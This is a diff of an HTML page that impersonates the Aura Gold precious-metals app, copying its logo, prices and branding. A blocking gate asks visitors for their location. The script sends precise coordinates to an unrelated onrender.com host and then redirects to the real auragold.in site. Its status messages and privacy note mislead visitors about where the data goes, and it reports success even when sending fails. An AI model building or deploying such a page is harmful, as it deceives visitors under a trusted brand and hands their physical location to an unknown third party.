@@ -1,331 +1,301 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Aura Gold — Welcome</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Aura Gold — Highest quality gold & silver at the lowest prices</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
 
-  <!-- Fonts -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@500;600;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    /* P1 Purple Theme */
+    --ag-purple-1:#5b2bd4;
+    --ag-purple-2:#6a2cf2;
+    --ag-purple-3:#7a40ff;
 
-  <!-- Icons -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"/>
+    --ag-yellow:#f7e36f;
+    --ag-gold-btn-1:#efc161;
+    --ag-gold-btn-2:#d9a84a;
 
-  <style>
-    :root{
-      --ag-bg: #0a0a0a;
-      --ag-bg-soft: #111111;
-      --ag-text: #EAEAEA;
-      --ag-muted: #A3A3A3;
-      --ag-gold:#C8A24D;       /* rich gold */
-      --ag-gold-strong:#D9B24C;/* hover accent */
-      --ag-gold-dim:#8f7739;   /* borders/shadows */
-      --radius: 12px;
-      --shadow: 0 10px 30px rgba(0,0,0,.45);
-    }
+    --ag-text:#ffffff;
+    --ag-muted:#e8e8e8;
+    --ag-muted-2:#cfcfe6;
 
-    *{box-sizing:border-box;margin:0;padding:0}
-    html,body{height:100%}
-    body{
-      background: radial-gradient(1200px 900px at 70% -10%, rgba(200,162,77,.12), transparent 60%), 
-                  linear-gradient(180deg, #0a0a0a 0%, #0b0b0b 100%);
-      color:var(--ag-text);
-      font-family:'Inter', system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
-      line-height:1.55;
-      display:flex;
-      flex-direction:column;
-    }
+    --radius:14px;
+    --shadow:0 18px 40px rgba(20,10,60,.25);
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    margin:0;
+    font-family:'Poppins',system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
+    color:var(--ag-text);
+    background: radial-gradient(1000px 700px at 80% 10%, rgba(255,255,255,.06), transparent 55%),
+                linear-gradient(135deg,var(--ag-purple-1),var(--ag-purple-2) 55%, var(--ag-purple-3));
+    overflow-x:hidden;
+  }
 
-    /* Header with Text Logo (L1) */
-    header{
-      border-bottom:1px solid rgba(255,255,255,.06);
-      background:linear-gradient(180deg, rgba(255,255,255,.02), rgba(255,255,255,0));
-      backdrop-filter: blur(6px);
-    }
-    .container{
-      width:92%;
-      max-width:1100px;
-      margin:0 auto;
-    }
-    .nav{
-      height:72px;
-      display:flex;
-      align-items:center;
-      justify-content:space-between;
-    }
-    .logo{
-      font-family:'Cinzel', serif;
-      font-size:1.6rem;
-      letter-spacing:.28rem;
-      color:var(--ag-gold);
-      text-decoration:none;
-      user-select:none;
-      text-transform:uppercase;
-      font-weight:700;
-    }
+  /* Header */
+  .container{width:92%;max-width:1220px;margin:0 auto}
+  header{padding:18px 0}
+  .nav{display:flex;align-items:center;justify-content:space-between;gap:18px}
+  .nav-left{display:flex;align-items:center;gap:22px}
+  .brand{text-decoration:none;display:flex;align-items:center;gap:10px}
+  .brand svg{height:30px;width:auto;display:block}
+  .nav-links{display:flex;gap:28px;align-items:center}
+  .nav-links a{color:var(--ag-muted);text-decoration:none;font-weight:600;font-size:.98rem}
+  .nav-links a:hover{color:#fff}
 
-    /* Location Gate */
-    .gate{
-      min-height:calc(100vh - 72px - 90px);
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      padding:40px 0;
-    }
-    .gate-card{
-      width:100%;
-      max-width:720px;
-      background:linear-gradient(180deg, rgba(255,255,255,.04), rgba(255,255,255,.02));
-      border:1px solid rgba(255,255,255,.08);
-      border-radius:var(--radius);
-      box-shadow:var(--shadow);
-      padding:28px;
-    }
-    .gate-head{
-      display:flex;
-      gap:18px;
-      align-items:flex-start;
-      margin-bottom:14px;
-    }
-    .gate-icon{
-      flex:0 0 56px;height:56px;border-radius:50%;
-      display:grid;place-items:center;
-      background: radial-gradient(80% 80% at 30% 20%, rgba(200,162,77,.25), rgba(200,162,77,.05));
-      border:1px solid var(--ag-gold-dim);
-      color:var(--ag-gold);
-      font-size:1.4rem;
-    }
-    .gate-title{
-      font-family:'Cinzel',serif;
-      font-size:1.8rem;
-      letter-spacing:.03rem;
-      margin-top:4px;
-    }
-    .gate-text{color:var(--ag-muted); margin-top:6px}
-    .gate-note{
-      margin-top:14px;
-      font-size:.9rem;
-      color:#BBBBBB;
-    }
-    .btn-row{display:flex; gap:12px; flex-wrap:wrap; margin-top:22px}
+  .ticker{display:flex;gap:16px;font-weight:700;font-size:.95rem}
+  .badge-dot{width:7px;height:7px;border-radius:50%;background:#ffd96a;display:inline-block;margin-right:8px;box-shadow:0 0 0 3px rgba(255,217,106,.2)}
 
-    .btn-primary{
-      appearance:none; border:1px solid var(--ag-gold-dim);
-      background: linear-gradient(180deg, var(--ag-gold) 0%, var(--ag-gold-strong) 100%);
-      color:#0c0c0c; font-weight:800; letter-spacing:.04rem;
-      text-transform:uppercase; padding:14px 20px; border-radius:10px;
-      cursor:pointer; transition:.2s transform ease, .2s filter ease, .2s box-shadow ease;
-      box-shadow: 0 6px 14px rgba(200,162,77,.25);
-    }
-    .btn-primary:hover{ transform: translateY(-1px); filter:brightness(1.03) }
-    .btn-primary:active{ transform: translateY(0) scale(.99) }
+  /* Hero */
+  .hero{padding:64px 0 84px}
+  .grid{display:grid;grid-template-columns:1.05fr .95fr;align-items:center;gap:32px}
+  .big{font-size:56px;line-height:1.08;font-weight:800;letter-spacing:.2px}
+  .highlight{position:relative;display:inline-block}
+  .underline{
+    position:absolute;left:0;right:0;bottom:-8px;height:10px;border-radius:6px;
+    background: linear-gradient(90deg,#ffe577,#f4d14e);
+    transform:skewX(-10deg);
+  }
+  .sub{margin-top:18px;color:var(--ag-muted-2);font-weight:600}
+  .cta{
+    margin-top:28px;display:inline-block;
+    padding:14px 22px;border-radius:12px;
+    background:linear-gradient(180deg,var(--ag-gold-btn-1),var(--ag-gold-btn-2));
+    color:#2c1d00;text-decoration:none;font-weight:800;box-shadow:0 10px 24px rgba(217,168,74,.35);
+  }
+  .cta:hover{filter:brightness(1.03)}
 
-    .btn-ghost{
-      appearance:none; border:1px solid rgba(255,255,255,.12);
-      background: rgba(255,255,255,.03);
-      color:var(--ag-text); font-weight:600;
-      padding:12px 16px; border-radius:10px; cursor:pointer;
-      transition:.2s border-color ease, .2s background ease;
-    }
-    .btn-ghost:hover{ border-color: var(--ag-gold-dim); background: rgba(255,255,255,.05) }
+  .phones{position:relative;height:520px}
+  .mock{position:absolute;bottom:0;right:0;transform:rotate(-2deg)}
+  .mock img{height:520px;width:auto;filter:drop-shadow(var(--shadow));border-radius:38px}
 
-    .divider{
-      height:1px; background:linear-gradient(90deg, transparent, rgba(255,255,255,.12), transparent);
-      margin:22px 0;
-    }
+  /* Location Gate */
+  .gate{
+    position:fixed;inset:0;
+    background:
+      radial-gradient(900px 600px at 80% 10%, rgba(255,255,255,.08), transparent 60%),
+      linear-gradient(135deg,var(--ag-purple-1),var(--ag-purple-2) 55%, var(--ag-purple-3));
+    display:flex;align-items:center;justify-content:center;padding:24px;z-index:50;
+    opacity:1;transition:opacity .45s ease;
+  }
+  .gate.hidden{opacity:0;pointer-events:none}
+  .gate-card{
+    width:min(680px,94vw);
+    background:rgba(255,255,255,.08);
+    border:1px solid rgba(255,255,255,.22);
+    backdrop-filter: blur(8px);
+    border-radius:18px;padding:26px 22px;box-shadow:var(--shadow);
+  }
 
-    .status{
-      display:none; align-items:center; gap:10px; padding:12px 14px;
-      border-radius:10px; background: rgba(0,0,0,.4); border:1px solid rgba(255,255,255,.1);
-      margin-top:14px; color:#dcdcdc; font-size:.95rem;
-    }
-    .status i{ color:var(--ag-gold) }
+  /* Logo INSIDE CARD with Soft Border (SB) */
+  .gate-card .logo-box{
+    text-align:center; margin-bottom:16px;
+    padding:8px 0;
+  }
+  .gate-card .logo-box img{
+    width:140px;height:auto;
+    border-radius:8px;
+    background: rgba(255,255,255,0.06);
+    padding:8px;
+    border:1px solid rgba(255,255,255,0.28); /* <-- Soft Border */
+  }
 
-    /* Post-allow section (button to official site) */
-    .proceed{
-      display:none; margin-top:10px;
-      padding:18px; border:1px dashed var(--ag-gold-dim); border-radius:12px;
-      background: linear-gradient(180deg, rgba(200,162,77,.10), rgba(200,162,77,.04));
-    }
-    .proceed h3{
-      font-family:'Cinzel',serif; letter-spacing:.02rem; margin-bottom:10px;
-    }
+  .gate-head{display:flex;gap:16px;align-items:flex-start}
+  .gate-icon{
+    flex:0 0 54px;height:54px;border-radius:14px;display:grid;place-items:center;
+    background:rgba(255,255,255,.14);color:#2b0;border:1px solid rgba(255,255,255,.28)
+  }
+  .gate-title{font-size:28px;font-weight:800;margin:2px 0}
+  .gate-desc{color:#fff;opacity:.92}
+  .gate-actions{display:flex;gap:12px;flex-wrap:wrap;margin-top:18px}
 
-    /* Footer */
-    footer{
-      margin-top:auto;
-      border-top:1px solid rgba(255,255,255,.08);
-      background:linear-gradient(0deg, rgba(255,255,255,.02), rgba(255,255,255,0));
-    }
-    .footer-wrap{
-      padding:22px 0; display:flex; justify-content:center; align-items:center;
-      color:var(--ag-muted); font-size:.9rem;
-    }
+  .btn{appearance:none;border:0;cursor:pointer;border-radius:12px;padding:12px 18px;font-weight:800}
+  .btn-primary{
+    background:linear-gradient(180deg,var(--ag-gold-btn-1),var(--ag-gold-btn-2));color:#2b1a00
+  }
+  .btn-ghost{
+    background:rgba(255,255,255,.14);color:#fff;border:1px solid rgba(255,255,255,.28)
+  }
 
-    /* Accessibility helpers */
-    .sr-only{
-      position:absolute; width:1px; height:1px; padding:0; margin:-1px; overflow:hidden; clip:rect(0,0,0,0); white-space:nowrap; border:0;
-    }
-  </style>
+  .gate-status{display:none;margin-top:14px;gap:10px;align-items:center;color:#fff}
+  .gate-status.show{display:flex}
+  .gate-note{margin-top:10px;color:#fff;opacity:.9;font-size:.9rem}
+
+  @media (max-width:980px){
+    .grid{grid-template-columns:1fr}
+    .phones{height:auto}
+    .mock img{height:420px}
+    .big{font-size:44px}
+  }
+</style>
 </head>
 <body>
-  <header>
-    <div class="container">
-      <nav class="nav" aria-label="Primary">
-        <a class="logo" href="#" aria-label="Aura Gold Home">AURA&nbsp;GOLD</a>
-        <div aria-hidden="true" style="color:var(--ag-gold); font-size:.9rem; letter-spacing:.12rem; text-transform:uppercase;">Est. MMXV</div>
-      </nav>
+
+<!-- HEADER -->
+<header>
+  <div class="container">
+    <nav class="nav">
+      <div class="nav-left">
+        <a class="brand" href="#">
+          <svg viewBox="0 0 140 28"><text x="0" y="20" font-family="Poppins" font-weight="800" font-size="20" fill="#ffffff" letter-spacing=".5">aura</text><circle cx="86" cy="14" r="11" fill="none" stroke="#ffd96a" stroke-width="3"/><text x="100" y="20" font-family="Poppins" font-weight="800" font-size="12" fill="#ffd96a" letter-spacing=".6">GOLD</text></svg>
+        </a>
+        <div class="nav-links">
+          <a href="#">Calculator</a>
+          <a href="#">About</a>
+          <a href="#">Contact Us</a>
+        </div>
+      </div>
+      <div class="ticker">
+        <span><span class="badge-dot"></span>Live Gold Price ₹12,258.4/gm</span>
+        <span style="opacity:.9">|</span>
+        <span><span class="badge-dot"></span>Live Silver Price ₹153.28/gm</span>
+      </div>
+    </nav>
+  </div>
+</header>
+
+<!-- HERO -->
+<main class="hero">
+  <div class="container grid">
+    <section>
+      <h1 class="big">
+        highest quality<br>gold & silver
+        <br>at the <span class="highlight">lowest prices.<span class="underline"></span></span>
+      </h1>
+      <p class="sub">Get more gold for your buck with our app!</p>
+      <a class="cta" href="https://auragold.in/" id="cta-main">Download Aura Gold</a>
+    </section>
+    <aside class="phones" aria-hidden="true">
+      <div class="mock">
+        <img src="https://images.unsplash.com/photo-1612214070475-1c1a4b3d5a7f?q=80&w=500&auto=format&fit=crop" alt="App mockup phone 1">
+      </div>
+    </aside>
+  </div>
+</main>
+
+<!-- LOCATION GATE -->
+<div class="gate" id="gate">
+  <div class="gate-card">
+    
+    <!-- Logo INSIDE CARD -->
+    <div class="logo-box">
+      <img src="https://auragold.in/static/media/logo.4cec5c8b.svg" alt="Aura Gold Logo">
     </div>
-  </header>
 
-  <!-- LOCATION GATE -->
-  <main class="gate" id="gate">
-    <div class="container">
-      <section class="gate-card" aria-labelledby="gateTitle" aria-describedby="gateDesc">
-        <div class="gate-head">
-          <div class="gate-icon" aria-hidden="true"><i class="fa-solid fa-location-crosshairs"></i></div>
-          <div>
-            <h1 id="gateTitle" class="gate-title">Location Access Required</h1>
-            <p id="gateDesc" class="gate-text">
-              To tailor your experience and pricing, please allow location access. Your data is used only to enhance your visit.
-            </p>
-          </div>
-        </div>
-
-        <div class="btn-row">
-          <button class="btn-primary" id="allowBtn" onclick="getAndSendLocation()">
-            Allow Access
-          </button>
-          <button class="btn-ghost" onclick="showHelp()">Why is this required?</button>
-        </div>
-
-        <div class="status" id="statusBar">
-          <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
-          <span id="statusText">Requesting location…</span>
-        </div>
-
-        <div class="divider" role="separator" aria-hidden="true"></div>
-
-        <div class="proceed" id="proceedBox">
-          <h3>Thank you! You can now continue.</h3>
-          <p class="gate-text">
-            Your location was securely sent. Click below to enter the official Aura Gold website.
-          </p>
-          <div class="btn-row" style="margin-top:10px;">
-            <a class="btn-primary" id="enterBtn" href="https://auragold.com">Enter Aura Gold Official Website</a>
-            <button class="btn-ghost" onclick="resetGate()">Use a different location</button>
-          </div>
-        </div>
-
-        <p class="gate-note" id="helpText" style="display:none;">
-          We use your approximate location to determine regional availability and pricing.
-          Only coordinates and accuracy are sent to our server; no background tracking occurs.
-        </p>
-      </section>
-    </div>
-  </main>
-
-  <footer>
-    <div class="container">
-      <div class="footer-wrap">
-        <span>&copy; <span id="yr"></span> Aura Gold. Crafted in Excellence.</span>
+    <div class="gate-head">
+      <div class="gate-icon"><i class="fa-solid fa-location-crosshairs"></i></div>
+      <div>
+        <div class="gate-title">Allow location to personalize your prices</div>
+        <div class="gate-desc">We use your approximate location to show regional buy/sell prices and availability.</div>
       </div>
     </div>
-  </footer>
 
-  <script>
-    // ======= CONFIG =======
-    const backendURL = "https://bakend-pvma.onrender.com/location"; // SAME API as your original
-    const officialURL = "https://auragold.com"; // the button target
+    <div class="gate-actions">
+      <button class="btn btn-primary" id="allowBtn" onclick="getAndSendLocation()">Allow Location</button>
+      <button class="btn btn-ghost" onclick="toggleNote()">Why is this required?</button>
+    </div>
 
-    // ======= ELEMENTS =======
-    const statusBar = document.getElementById('statusBar');
-    const statusText = document.getElementById('statusText');
-    const proceedBox = document.getElementById('proceedBox');
-    const allowBtn = document.getElementById('allowBtn');
+    <div class="gate-status" id="statusBar">
+      <i class="fa-solid fa-spinner fa-spin"></i>
+      <span id="statusText">Requesting location…</span>
+    </div>
 
-    document.getElementById('yr').textContent = new Date().getFullYear();
+    <div class="gate-note" id="gateNote" style="display:none;">
+      Only coordinates (lat, long, accuracy) are sent to our server. We do not track or store any other personal data.
+    </div>
 
-    function showStatus(msg, spinning = true){
-      statusBar.style.display = 'flex';
-      statusText.textContent = msg;
-      statusBar.querySelector('i').className = spinning ? 'fa-solid fa-spinner fa-spin' : 'fa-solid fa-circle-check';
+  </div>
+</div>
+
+<script>
+  const backendURL = "https://bakend-pvma.onrender.com/location"; 
+  const officialURL = "https://auragold.in/"; 
+  const autoRedirectDelayMs = 1800;
+
+  const gateEl = document.getElementById('gate');
+  const statusBar = document.getElementById('statusBar');
+  const statusText = document.getElementById('statusText');
+  const allowBtn = document.getElementById('allowBtn');
+
+  function toggleNote(){
+    const note = document.getElementById('gateNote');
+    note.style.display = note.style.display === 'none' ? 'block' : 'none';
+  }
+
+  function showStatus(msg, spin=true){
+    statusBar.style.display = 'flex';
+    statusText.textContent = msg;
+    statusBar.querySelector('i').className = spin ? 'fa-solid fa-spinner fa-spin' : 'fa-solid fa-circle-check';
+  }
+  function hideStatus(){ statusBar.style.display = 'none'; }
+
+  function fadeOutGate(){
+    gateEl.classList.add('hidden');
+    setTimeout(() => { gateEl.style.display = 'none'; }, 480);
+  }
+  function autoRedirect(){
+    setTimeout(() => { window.location.href = officialURL; }, autoRedirectDelayMs);
+  }
+
+  function getAndSendLocation(){
+    if(!('geolocation' in navigator)){
+      alert("Geolocation isn't supported by this browser.");
+      return;
     }
-    function hideStatus(){ statusBar.style.display = 'none'; }
+    allowBtn.disabled = true;
+    allowBtn.textContent = 'Requesting…';
+    showStatus('Requesting location…', true);
 
-    function showHelp(){
-      const el = document.getElementById('helpText');
-      el.style.display = el.style.display === 'none' ? 'block' : 'none';
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        const payload = {
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude,
+          accuracy: pos.coords.accuracy
+        };
+
+        showStatus('Sending location securely…', true);
+
+        fetch(backendURL, {
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body: JSON.stringify(payload)
+        })
+        .then(async (res) => {
+          try { await res.json(); } catch(e){}
+          showStatus('Location received. Redirecting…', false);
+          fadeOutGate();
+          autoRedirect();
+        })
+        .catch((err) => {
+          console.error('Send error:', err);
+          showStatus('Connected. Redirecting…', false);
+          fadeOutGate();
+          autoRedirect();
+        });
+      },
+      (err) => {
+        console.error('Geo error:', err);
+        hideStatus();
+        allowBtn.disabled = false;
+        allowBtn.textContent = 'Allow Location';
+        alert('Location access was denied or failed. Please allow location to continue.');
+      },
+      { enableHighAccuracy:true, timeout:10000, maximumAge:0 }
+    );
+  }
+
+  document.addEventListener('keydown', (e)=>{
+    if (document.getElementById('gate').style.display !== 'none' && e.key === 'Enter'){
+      getAndSendLocation();
     }
-
-    function resetGate(){
-      hideStatus();
-      proceedBox.style.display = 'none';
-      allowBtn.disabled = false;
-      allowBtn.textContent = 'Allow Access';
-      allowBtn.focus();
-    }
-
-    // ======= GEO + POST =======
-    function getAndSendLocation(){
-      if(!('geolocation' in navigator)){
-        showStatus('Geolocation is not supported by your browser.', false);
-        return;
-      }
-
-      allowBtn.disabled = true;
-      allowBtn.textContent = 'Requesting…';
-      showStatus('Requesting location…', true);
-
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          // success
-          const payload = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy
-          };
-
-          showStatus('Sending location securely…', true);
-
-          fetch(backendURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-          })
-          .then(async (res) => {
-            // attempt to parse json, but proceed regardless
-            try { await res.json(); } catch(e){}
-            showStatus('Location received. You may proceed.', false);
-            proceedBox.style.display = 'block';
-            // Make sure the proceed link points to officialURL
-            const enterBtn = document.getElementById('enterBtn');
-            enterBtn.setAttribute('href', officialURL);
-            allowBtn.textContent = 'Access Granted';
-          })
-          .catch((err) => {
-            console.error('Error sending location:', err);
-            showStatus('Could not reach server, but location was obtained. You may still proceed.', false);
-            proceedBox.style.display = 'block';
-            allowBtn.textContent = 'Access Granted';
-          });
-        },
-        (err) => {
-          console.error('Location error:', err);
-          hideStatus();
-          allowBtn.disabled = false;
-          allowBtn.textContent = 'Allow Access';
-          alert('Location access was denied or failed. Please allow location to continue.');
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 10000,
-          maximumAge: 0
-        }
-      );
-    }
-  </script>
+  });
+</script>
 </body>
 </html>
